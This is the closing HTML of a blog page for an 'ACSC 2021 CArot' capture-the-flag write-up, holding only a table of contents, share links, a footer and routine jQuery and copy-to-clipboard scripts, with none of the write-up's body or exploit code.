+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Checksec"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Overview"><span class="toc-number">2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#read-primitive"><span class="toc-number">3.1.</span> <span class="toc-text">read primitive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#write-primitive"><span class="toc-number">3.2.</span> <span class="toc-text">write primitive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add-primitive"><span class="toc-number">3.3.</span> <span class="toc-text">add primitive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#expl-py"><span class="toc-number">3.4.</span> <span class="toc-text">expl.py</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://4n0nym4u5.github.io/2022/01/14/CArot/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&text=ACSC 2021 CArot writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&is_video=false&description=ACSC 2021 CArot writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ACSC 2021 CArot writeup&body=Check out this article: http://4n0nym4u5.github.io/2022/01/14/CArot/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&name=ACSC 2021 CArot writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://4n0nym4u5.github.io/2022/01/14/CArot/&t=ACSC 2021 CArot writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    4n0nym4u5
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
